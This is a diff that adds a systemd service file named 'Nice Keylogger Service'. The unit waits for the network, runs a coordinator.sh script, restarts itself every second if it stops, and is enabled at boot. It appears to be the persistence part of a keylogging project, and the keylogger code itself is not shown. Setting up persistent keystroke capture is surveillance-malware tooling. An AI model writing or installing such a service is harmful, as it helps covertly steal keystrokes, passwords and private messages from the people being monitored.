@@ -1,0 +1,16 @@
+[Unit]
+Description="Nice Keylogger Service"
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+SyslogIdentifier=nicekeylogger
+WorkingDirectory='~/'
+# TODO confirm this directory works
+Type=simple
+Restart=always
+RestartSec=1
+ExecStart=/bin/sh coordinator.sh
+
+[Install]
+WantedBy=multi-user.target
